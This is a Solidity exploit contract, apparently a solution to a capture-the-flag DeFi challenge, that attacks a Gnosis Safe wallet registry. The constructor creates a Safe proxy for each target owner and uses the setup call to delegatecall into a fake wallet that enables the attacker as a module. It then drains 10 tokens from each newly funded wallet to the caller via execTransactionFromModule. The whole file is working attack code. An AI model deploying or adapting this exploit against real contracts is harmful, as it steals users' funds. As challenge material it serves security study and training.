// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "./AttackFakeWallet.sol";
import "./WalletRegistry.sol";

contract AttackWalletRegistry {
    constructor(
        GnosisSafeProxyFactory factory,
        address safe,
        address registry,
        address token,
        address[] memory targets
    ) payable {
        AttackFakeWallet fakeWallet = new AttackFakeWallet();

        bytes memory enableModule2Call = abi.encodeWithSignature(
            "enableModule2(address)",
            address(this)
        );

        bytes memory transferCall = abi.encodeWithSignature(
            "transfer(address,uint256)",
            msg.sender,
            10 ether
        );

        for (uint256 idx = 0; idx < targets.length; idx++) {
            address[] memory owners = new address[](1);
            owners[0] = targets[idx];

            bytes memory setupCall = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(fakeWallet),
                enableModule2Call,
                address(0),
                address(0),
                0,
                address(0)
            );

            factory.createProxyWithCallback(
                safe,
                setupCall,
                0,
                IProxyCreationCallback(registry)
            );

            address targetWallet = WalletRegistry(registry).wallets(
                targets[idx]
            );

            GnosisSafe(payable(targetWallet)).execTransactionFromModule(
                token,
                0,
                transferCall,
                Enum.Operation.Call
            );
        }
    }
}
